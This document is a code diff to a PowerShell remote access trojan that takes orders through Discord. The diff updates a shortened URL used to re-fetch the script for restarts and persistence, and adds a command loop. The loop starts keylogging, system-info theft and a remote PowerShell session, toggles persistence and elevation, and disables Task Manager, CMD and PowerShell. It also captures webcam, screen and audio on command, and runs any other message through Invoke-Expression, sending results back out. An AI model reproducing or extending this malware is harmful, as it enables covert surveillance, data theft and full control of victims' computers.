@@ -40,7 +40,7 @@ if ($auto -eq 'n') {
     $defaultstart = 0 
 }
 
-$global:parent = "is.gd/0IyRWT" # parent script URL (for restarts and persistance)
+$global:parent = "is.gd/qv6G96" # parent script URL (for restarts and persistance)
 
 # remove restart stager (if present)
 if (Test-Path "C:\Windows\Tasks\service.vbs") {
@@ -816,9 +816,9 @@ Function NearbyWifi {
                     $networks += $currentNetwork
                 }
                 $currentNetwork = [PSCustomObject]@{
-                    SSID = $matches[1].Trim()
-                    Signal = 0  # Initialiser à 0 pour le tri numérique
-                    Band = "N/A"
+                    SSID     = $matches[1].Trim()
+                    Signal   = 0  # Initialiser à 0 pour le tri numérique
+                    Band     = "N/A"
                     Security = "N/A"
                 }
             }
@@ -1672,8 +1672,8 @@ Function Exfiltrate {
                                         $filesToShow = if ($fileList.Count -le 15) { $fileList } else { $fileList[0..14] }
                                         foreach ($f in $filesToShow) {
                                             $sizeStr = if ($f.Size -lt 1KB) { "$($f.Size) B" } 
-                                                      elseif ($f.Size -lt 1MB) { "$([math]::Round($f.Size/1KB, 2)) KB" }
-                                                      else { "$([math]::Round($f.Size/1MB, 2)) MB" }
+                                            elseif ($f.Size -lt 1MB) { "$([math]::Round($f.Size/1KB, 2)) KB" }
+                                            else { "$([math]::Round($f.Size/1MB, 2)) MB" }
                                             $archiveSummary += "  - $($f.Name) ($sizeStr)`n"
                                         }
                                         
@@ -1764,8 +1764,8 @@ Function Exfiltrate {
                     $filesToShow = if ($fileList.Count -le 15) { $fileList } else { $fileList[0..14] }
                     foreach ($f in $filesToShow) {
                         $sizeStr = if ($f.Size -lt 1KB) { "$($f.Size) B" } 
-                                  elseif ($f.Size -lt 1MB) { "$([math]::Round($f.Size/1KB, 2)) KB" }
-                                  else { "$([math]::Round($f.Size/1MB, 2)) MB" }
+                        elseif ($f.Size -lt 1MB) { "$([math]::Round($f.Size/1KB, 2)) KB" }
+                        else { "$([math]::Round($f.Size/1MB, 2)) MB" }
                         $archiveSummary += "  - $($f.Name) ($sizeStr)`n"
                     }
                     
@@ -1827,7 +1827,7 @@ Function Exfiltrate {
 
 Function Upload {
     param (
-        [Parameter(ValueFromRemainingArguments=$true)]
+        [Parameter(ValueFromRemainingArguments = $true)]
         [string[]]$Path
     )
     
@@ -4004,3 +4004,259 @@ while ($true) {
 }
 
 
+        $lootrunning = Get-Job -Name Info -ErrorAction SilentlyContinue
+        $keysrunning = Get-Job -Name Keys -ErrorAction SilentlyContinue
+        if ($messages -eq 'webcam') {
+            sendMsg -Message ":no_entry: ``AUTOMATIC CAPTURE DISABLED - Use 'TakePhoto' command for manual camera capture`` :no_entry:"
+        }
+        if ($messages -eq 'screenshots') {
+            sendMsg -Message ":no_entry: ``AUTOMATIC CAPTURE DISABLED - Use 'TakeScreenshot' command for manual screenshot capture`` :no_entry:"
+        }
+        if ($messages -eq 'psconsole') {
+            if (!($PSrunning)) {
+                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
+                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME PS Session Started!`` :white_check_mark:"
+            }
+            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
+        }
+        if ($messages -eq 'microphone') {
+            sendMsg -Message ":no_entry: ``AUTOMATIC CAPTURE DISABLED - Use 'RecordAudioClip X' command for manual audio recording (e.g. RecordAudioClip 30)`` :no_entry:"
+        }
+        if ($messages -eq 'keycapture') {
+            if (!($keysrunning)) {
+                try {
+                    Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID -ErrorAction Stop
+                    sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Keycapture Session Started!`` :white_check_mark:"
+                }
+                catch {
+                    sendMsg -Message ":octagonal_sign: ``Failed to start Keylogger: $($_.Exception.Message)`` :octagonal_sign:"
+                }
+            }
+            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
+        }
+        if ($messages -eq 'systeminfo') {
+            if (!($lootrunning)) {
+                Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
+                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Gathering System Info!`` :white_check_mark:"
+            }
+            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
+        }
+        if ($messages -eq 'pausejobs') {
+            Get-Job | Where-Object { $_.Name -in @('Audio', 'Screen', 'Webcam', 'PSconsole', 'Keys', 'Info') } | Stop-Job -ErrorAction SilentlyContinue
+            Get-Job | Where-Object { $_.Name -in @('Audio', 'Screen', 'Webcam', 'PSconsole', 'Keys', 'Info') } | Remove-Job -ErrorAction SilentlyContinue
+            sendMsg -Message ":no_entry: ``Stopped All Jobs! : $env:COMPUTERNAME`` :no_entry:"   
+        }
+        if ($messages -eq 'resumejobs') {
+            if (!($lootrunning)) {
+                Start-Job -ScriptBlock $dolootjob -Name Info -ArgumentList $global:token, $global:LootID
+                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Gathering System Info!`` :white_check_mark:"
+            }
+            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
+            if (!($keysrunning)) {
+                Start-Job -ScriptBlock $doKeyjob -Name Keys -ArgumentList $global:token, $global:keyID
+                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME Keycapture Session Started!`` :white_check_mark:"
+            }
+            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
+            if (!($PSrunning)) {
+                Start-Job -ScriptBlock $doPowershell -Name PSconsole -ArgumentList $global:token, $global:PowershellID
+                sendMsg -Message ":white_check_mark: ``$env:COMPUTERNAME PS Session Started!`` :white_check_mark:"
+            }
+            else { sendMsg -Message ":no_entry: ``Already Running!`` :no_entry:" }
+            sendMsg -Message ":white_check_mark: ``Resumed Available Jobs! (Automatic capture jobs disabled - use manual commands: TakePhoto, TakeScreenshot, RecordAudioClip)`` :white_check_mark:"   
+        }
+        if ($messages -eq 'close') {
+            CloseMsg
+            sleep 2
+            exit      
+        }
+        elseif ($messages -match '^RecordAudioClip\s+(\d+)$') {
+            $duration = [int]$matches[1]
+            RecordAudioClip -Duration $duration
+        }
+        elseif ($messages -match '^(?i)(IsAdmin|Elevate|RemovePersistance|AddPersistance|CheckPersistance|TakePhoto|TakeScreenshot|DisableTaskManager|EnableTaskManager|DisableCMD|EnableCMD|DisablePowerShell|EnablePowerShell)$') {
+            $cmdName = $matches[1]
+            if ($cmdName -eq 'IsAdmin') { IsAdmin }
+            elseif ($cmdName -eq 'Elevate') { Elevate }
+            elseif ($cmdName -eq 'RemovePersistance') { RemovePersistance }
+            elseif ($cmdName -eq 'AddPersistance') { AddPersistance }
+            elseif ($cmdName -eq 'CheckPersistance') { CheckPersistance }
+            elseif ($cmdName -eq 'TakePhoto') { TakePhoto }
+            elseif ($cmdName -eq 'TakeScreenshot') { TakeScreenshot }
+            elseif ($cmdName -eq 'DisableTaskManager') { DisableTaskManager }
+            elseif ($cmdName -eq 'EnableTaskManager') { EnableTaskManager }
+            elseif ($cmdName -eq 'DisableCMD') { DisableCMD }
+            elseif ($cmdName -eq 'EnableCMD') { EnableCMD }
+            elseif ($cmdName -eq 'DisablePowerShell') { DisablePowerShell }
+            elseif ($cmdName -eq 'EnablePowerShell') { EnablePowerShell }
+        }
+        elseif ($messages -match '^(?i)Upload\s+(.+)$') {
+            # Parser la commande Upload avec support de -Path et -Destination
+            $uploadArgs = $matches[1].Trim()
+            
+            # Extraire -Destination si présent
+            $destination = $null
+            if ($uploadArgs -match '-Destination\s+["'']?([^"'']+)["'']?') {
+                $destination = $matches[1].Trim('"', "'")
+                $uploadArgs = $uploadArgs -replace '-Destination\s+["'']?[^"'']+["'']?\s*', ''
+            }
+            
+            # Extraire -Path si présent, sinon utiliser tout l'argument
+            $paths = @()
+            if ($uploadArgs -match '-Path\s+(.+)') {
+                $pathString = $matches[1].Trim()
+                # Parser les chemins multiples (séparés par des espaces, entre guillemets)
+                $pathString = $pathString.Trim('"', "'")
+                $paths = $pathString -split '\s+(?=(?:[^"'']*["''])?[^"'']*$)'
+                $paths = $paths | Where-Object { -not [string]::IsNullOrWhiteSpace($_) } | ForEach-Object { $_.Trim('"', "'") }
+            }
+            else {
+                # Pas de -Path, parser directement les chemins
+                $paths = $uploadArgs -split '\s+(?=(?:[^"'']*["''])?[^"'']*$)'
+                $paths = $paths | Where-Object { -not [string]::IsNullOrWhiteSpace($_) } | ForEach-Object { $_.Trim('"', "'") }
+            }
+            
+            if ($paths.Count -eq 0) {
+                sendMsg -Message ":octagonal_sign: ``No paths provided. Usage: Upload -Path \"file1\" \"file2\" [-Destination \"C:\\path\"]`` :octagonal_sign:"
+            }
+            else {
+                if ($destination) {
+                    Upload -Path $paths -Destination $destination
+                }
+                else {
+                    Upload -Path $paths
+                }
+            }
+        }
+        elseif ($messages -match '^(?i)OpenURL\s+(?:-Url\s+)?(.+)$') {
+            # Parser la commande OpenURL avec l'URL
+            $url = $matches[1].Trim()
+            $url = $url.Trim('"', "'")
+            OpenURL -Url $url
+        }
+        elseif ($messages -match '^(?i)BlockURL\s+(?:-Url\s+)?(.+)$') {
+            # Parser la commande BlockURL avec l'URL
+            $url = $matches[1].Trim()
+            $url = $url.Trim('"', "'")
+            BlockURL -Url $url
+        }
+        elseif ($messages -match '^(?i)UnblockURL\s+(?:-Url\s+)?(.+)$') {
+            # Parser la commande UnblockURL avec l'URL
+            $url = $matches[1].Trim()
+            $url = $url.Trim('"', "'")
+            UnblockURL -Url $url
+        }
+        elseif ($messages -match '^(?i)GetMousePosition$') {
+            GetMousePosition
+        }
+        elseif ($messages -match '^(?i)MoveMouse\s+-X\s+(\d+)\s+-Y\s+(\d+)$') {
+            $x = [int]$matches[1]
+            $y = [int]$matches[2]
+            MoveMouse -X $x -Y $y
+        }
+        elseif ($messages -match '^(?i)MouseClick\s+(?:-Button\s+)?(left|right)$') {
+            $button = $matches[1]
+            MouseClick -Button $button
+        }
+        elseif ($messages -match '^(?i)MouseClick\s+-Button\s+(left|right)$') {
+            $button = $matches[1]
+            MouseClick -Button $button
+        }
+        elseif ($messages -match '^(?i)TypeText\s+(?:-Text\s+)?["''](.+)["'']$') {
+            $text = $matches[1]
+            TypeText -Text $text
+        }
+        elseif ($messages -match '^(?i)TypeText\s+-Text\s+(.+)$') {
+            $text = $matches[1].Trim('"', "'")
+            TypeText -Text $text
+        }
+        elseif ($messages -match '^(?i)(NearbyWifi|SpeechToText|TextToSpeech)$') {
+            $cmdName = $matches[1]
+            if ($cmdName -eq 'NearbyWifi') { NearbyWifi }
+            elseif ($cmdName -eq 'SpeechToText') { SpeechToText }
+            elseif ($cmdName -eq 'TextToSpeech') { 
+                sendMsg -Message ":octagonal_sign: ``Usage: TextToSpeech -Text \"your message\"`` :octagonal_sign:"
+            }
+        }
+        elseif ($messages -match '^(?i)TextToSpeech\s+(?:-Text\s+)?["''](.+)["'']$') {
+            $text = $matches[1]
+            TextToSpeech -Text $text
+        }
+        elseif ($messages -match '^(?i)TextToSpeech\s+-Text\s+(.+)$') {
+            $text = $matches[1].Trim('"', "'")
+            TextToSpeech -Text $text
+        }
+        else { 
+            try {
+                # Exécuter la commande avec capture complète de la sortie
+                $ErrorActionPreference = 'Continue'
+                $output = Invoke-Expression $messages 2>&1 | Out-String
+                
+                if ([string]::IsNullOrWhiteSpace($output)) {
+                    $output = "Command executed successfully (no output)"
+                }
+                
+                # Diviser en messages si nécessaire (limite Discord ~2000 caractères)
+                $maxMessageSize = 1950
+                if ($output.Length -le $maxMessageSize) {
+                    sendMsg -Message "``````$output``````"
+                }
+                else {
+                    # Diviser en plusieurs messages
+                    $outputLines = $output -split "`r?`n"
+                    $currentBatch = ""
+                    $batchNumber = 1
+                    $totalBatches = [Math]::Ceiling(($output.Length / $maxMessageSize))
+                    
+                    foreach ($line in $outputLines) {
+                        $lineWithNewline = $line + "`n"
+                        if (([System.Text.Encoding]::UTF8.GetByteCount($currentBatch + $lineWithNewline)) -gt $maxMessageSize) {
+                            if ($currentBatch.Length -gt 0) {
+                                sendMsg -Message "``````[Part $batchNumber/$totalBatches]`n$currentBatch``````"
+                                Start-Sleep -Milliseconds 500
+                                $batchNumber++
+                                $currentBatch = ""
+                            }
+                        }
+                        $currentBatch += $lineWithNewline
+                    }
+                    
+                    if ($currentBatch.Length -gt 0) {
+                        sendMsg -Message "``````[Part $batchNumber/$totalBatches]`n$currentBatch``````"
+                    }
+                }
+            }
+            catch {
+                $errorDetails = $_.Exception | Format-List -Force | Out-String
+                $errorMessage = "Error: $($_.Exception.Message)`n`nDetails:`n$errorDetails"
+                
+                # Diviser les erreurs aussi si nécessaire
+                $maxErrorSize = 1950
+                if ($errorMessage.Length -le $maxErrorSize) {
+                    sendMsg -Message ":octagonal_sign: ``$errorMessage`` :octagonal_sign:"
+                }
+                else {
+                    $errorParts = $errorMessage -split "`n"
+                    $currentErrorBatch = ""
+                    $errorBatchNum = 1
+                    $totalErrorBatches = [Math]::Ceiling(($errorMessage.Length / $maxErrorSize))
+                    
+                    foreach ($part in $errorParts) {
+                        if (([System.Text.Encoding]::UTF8.GetByteCount($currentErrorBatch + "`n" + $part)) -gt $maxErrorSize) {
+                            if ($currentErrorBatch.Length -gt 0) {
+                                sendMsg -Message ":octagonal_sign: ``[Error Part $errorBatchNum/$totalErrorBatches]`n$currentErrorBatch`` :octagonal_sign:"
+                                Start-Sleep -Milliseconds 500
+                                $errorBatchNum++
+                                $currentErrorBatch = ""
+                            }
+                        }
+                        $currentErrorBatch += $part + "`n"
+                    }
+                    if ($currentErrorBatch.Length -gt 0) {
+                        sendMsg -Message ":octagonal_sign: ``[Error Part $errorBatchNum/$totalErrorBatches]`n$currentErrorBatch`` :octagonal_sign:"
+                    }
+                }
+            }
+        }
+    }
+    Sleep 3
+}
